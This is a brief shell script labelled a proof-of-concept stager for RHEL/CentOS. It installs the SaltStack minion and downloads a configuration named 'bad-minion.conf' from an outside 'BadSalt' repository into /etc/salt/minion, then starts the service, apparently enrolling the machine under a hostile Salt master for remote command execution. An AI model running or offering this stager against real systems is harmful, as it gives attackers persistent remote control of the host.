# PoC RHEL/CentOS Stager
sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest.el7.noarch.rpm
sudo yum install salt-minion
wget -O - https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf > /etc/salt/minion
sudo systemctl enable salt-minion --now
